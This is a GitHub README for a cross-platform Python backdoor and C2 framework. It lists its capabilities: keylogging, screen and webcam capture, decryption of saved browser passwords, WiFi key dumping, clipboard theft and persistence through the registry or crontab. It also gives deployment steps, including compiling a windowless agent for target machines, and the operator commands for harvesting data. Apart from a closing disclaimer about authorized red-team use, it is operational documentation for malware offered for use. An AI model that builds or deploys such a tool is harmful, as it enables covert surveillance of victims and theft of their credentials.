<h1 align="center">cyberm4fia-backdoor</h1>

<p align="center">
  <img src="https://img.shields.io/badge/mission-red%20team%20operations-black?style=for-the-badge" alt="mission">
</p>

<table align="center"><tr><td valign="middle">
<pre>
 ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███╗   ███╗██╗  ██╗███████╗██╗ █████╗
██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗████╗ ████║██║  ██║██╔════╝██║██╔══██╗
██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██╔████╔██║███████║█████╗  ██║███████║
██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║╚██╔╝██║╚════██║██╔══╝  ██║██╔══██║
╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║ ╚═╝ ██║     ██║██║     ██║██║  ██║
 ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
</pre>
</td><td valign="middle">
<img src="https://raw.githubusercontent.com/erkanrzgc/cyberm4fia-backdoor/main/resources/trojan.png" width="150">
</td></tr></table>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.9+-blue?style=flat-square&logo=python" alt="python">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-black?style=flat-square" alt="platforms">
  <img src="https://img.shields.io/badge/arch-modular-purple?style=flat-square" alt="arch">
  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="license">
  <img src="https://img.shields.io/github/last-commit/erkanrzgc/cyberm4fia-backdoor?style=flat-square" alt="last commit">
</p>

<p align="center">
  <b>cyberm4fia-backdoor</b> is a modular, cross-platform C2 framework with a keylogger, screenshot/webcam capture, browser credential extraction, WiFi dump, system reconnaissance, and persistence — all controlled through an interactive terminal shell over a JSON-based TCP protocol.
</p>

---

## Features

- **Modular architecture** — clean client/server split with pluggable modules
- **Cross-platform agent** — Windows and Linux support via a shared platform abstraction layer
- **JSON protocol** — newline-delimited JSON messages, buffered for reliability over TCP
- **Interactive C2 shell** — colored terminal interface with gradient CYBERM4FIA banner
- **File manager** — upload, download, list, move, delete, touch, read (recursive directory zip on download)
- **System reconnaissance** — OS version, CPU, RAM, local IP, current user, admin check
- **Keylogger** — `pynput`-based, window-aware, writes to hidden temp file, cross-platform
- **Screenshot & webcam** — captures screen or webcam and exfiltrates as PNG
- **Credential harvesting** — dumps saved Chrome/Edge passwords (AES-GCM decryption via CryptUnprotectData)
- **WiFi password dump** — extracts WLAN profiles and clear-text keys via `netsh`
- **Clipboard grab** — PowerShell on Windows, `pyperclip` fallback
- **Persistence** — registry `Run` key on Windows, `crontab @reboot` on Linux
- **Background & terminate** — non-blocking background mode, forced process tree kill
- **Dockerized C2 server** — one-command deployment with `docker compose up`
- **Config-driven** — `config.json` for both agent and server, no hardcoded values in source

---

## Architecture

```
cyberm4fia-backdoor/
├── client/                          # Target agent (backdoor)
│   ├── client.py                    # Entry point
│   ├── config.json                 # C2 server IP, port, reconnect interval
│   ├── core/
│   │   ├── protocol.py             # reliable_send / reliable_recv (JSON + \n)
│   │   ├── config.py               # Config loader with defaults
│   │   ├── connection.py           # Socket connect + reconnect loop
│   │   └── dispatcher.py           # Command router — maps strings to module functions
│   ├── modules/
│   │   ├── file_ops.py             # File system (ls, cd, rm, mv, up/download)
│   │   ├── shell.py                # subprocess wrapper with output decoding
│   │   ├── sysinfo.py              # Cross-platform system information
│   │   ├── surveillance.py         # Screenshot, webcam, clipboard
│   │   ├── keylogger.py            # pynput keylogger with window tracking
│   │   ├── persistence.py          # Install persistence
│   │   ├── credentials.py          # Browser passwords + WiFi profiles
│   │   └── process_ops.py          # Process listing, killing, broadcast
│   └── platform/                   # OS abstraction layer
│       ├── base.py                 # AbstractPlatform interface
│       ├── windows.py              # dir, tasklist, ipconfig, registry
│       └── linux.py                # ls, ps, ifconfig, crontab
│
├── server/                         # C2 control server
│   ├── server.py                   # Entry point
│   ├── config.json                 # Bind host, port, loot directory
│   ├── core/
│   │   ├── protocol.py             # JSON protocol (same wire format)
│   │   ├── config.py               # Server-side config loader
│   │   ├── listener.py             # bind → listen → accept loop
│   │   └── session.py              # Per-client interactive shell
│   ├── handlers/
│   │   ├── file_transfer.py        # Upload to target / download from target
│   │   └── local_commands.py       # help, clear, background
│   └── ui/
│       ├── banner.py               # ANSI gradient CYBERM4FIA banner
│       └── prompt.py               # ANSI color helper
│
├── resources/                      # Assets (trojan.png)
├── Dockerfile                      # Server container build
├── docker-compose.yml              # One-command C2 deployment
└── requirements.txt                # Python dependencies
```

---

## Installation

Requires Python **3.9+**.

### C2 Server

```bash
git clone https://github.com/erkanrzgc/cyberm4fia-backdoor.git
cd cyberm4fia-backdoor

# Run directly
python3 -m pip install -r requirements.txt
python3 -m server.server

# Or via Docker
docker compose up -d
```

### Agent (target machine)

Copy the `client/` directory to the target machine.

```bash
pip install pynput Pillow pyautogui pyscreeze pyperclip
python3 client/client.py
```

On Windows, compile to a single executable with PyInstaller:

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole client/client.py
```

---

## Configuration

Sensitive values are loaded from `.env` files (never committed). Template files are provided.

```bash
cp client/.env.example client/.env
cp server/.env.example server/.env
```

### `client/.env`

| Variable | Default | Description |
| --- | --- | --- |
| `CYBERM4FIA_SERVER_HOST` | `127.0.0.1` | C2 server IP address |
| `CYBERM4FIA_SERVER_PORT` | `5555` | C2 server port |
| `CYBERM4FIA_RECONNECT_INTERVAL` | `5` | Seconds between reconnect attempts |

### `server/.env`

| Variable | Default | Description |
| --- | --- | --- |
| `CYBERM4FIA_BIND_HOST` | `0.0.0.0` | Address to listen on |
| `CYBERM4FIA_BIND_PORT` | `5555` | Port to listen on |
| `CYBERM4FIA_LOOT_DIR` | `./loot` | Directory for screenshots, downloads |

---

## Usage

Once an agent connects, the server presents an interactive shell:

```
* Shell~192.168.1.100: help
```

### File Manager
```
ls                          List directory contents
cd <path>                   Change working directory
pwd                         Print working directory
rm <file>                   Delete a file
rm -r <dir>                 Recursively delete a directory
mv <src> <dst>              Move or rename
upload <local_file>         Upload from server to target
download <remote_path>      Download from target to server
```

### Surveillance
```
screenshot                  Capture and download screenshot
webcam                      Capture and download webcam photo
clipboard                   Dump clipboard contents
keylog_start                Start the keylogger
keylog_dump                 Retrieve captured keystrokes
keylog_stop                 Stop keylogger and delete log
```

### Reconnaissance
```
sysinfo                     Detailed system information
check_admin                 Check admin/root privileges
ip addr                     Network interface config
ps                          Process list
wifi_dump                   Extract saved WiFi passwords
browser_creds               Extract Chrome/Edge saved credentials
```

### Persistence
```
persistence <RegName> <FileName>   Install persistence
```

### Session Control
```
quit                        Terminate session
background                  Background session
clear                       Clear server terminal
```

---

## Docker

```bash
docker compose up -d        # Start C2 server in background
docker compose logs -f      # Follow logs
docker compose down         # Stop and remove
```

The `docker-compose.yml` mounts `./loot` into the container for persistent data.

---

## Protocol

Line-delimited JSON over TCP:

```
→ {"command": "sysinfo"}
← {"response": "Operating System: Windows 10 ..."}
```

Files are transferred as base64-encoded strings. The protocol handles partial reads with a persistent buffer, and sends are protected by a threading lock.

---

## Platform Support

| Feature | Windows | Linux |
| --- | :---: | :---: |
| Shell | dir / tasklist / ipconfig | ls / ps / ifconfig |
| Screenshot | pyautogui | pyautogui |
| Webcam | OpenCV | OpenCV |
| Keylogger | pynput + ctypes | pynput |
| Browser creds | Chrome / Edge (DPAPI) | — |
| WiFi dump | netsh wlan | — |
| Persistence | Registry Run | crontab @reboot |
| Clipboard | PowerShell | pyperclip |

---

## Legal & Ethical Use

This tool is for:

- Authorized penetration testing and red-team engagements
- Security research in isolated lab environments
- CTF competitions and educational exercises
- Use on your own systems with your own consent

**Do not** deploy on any system you do not own or have explicit written authorization to test. The authors accept no responsibility for misuse.

---

## License

MIT — see [LICENSE](LICENSE).
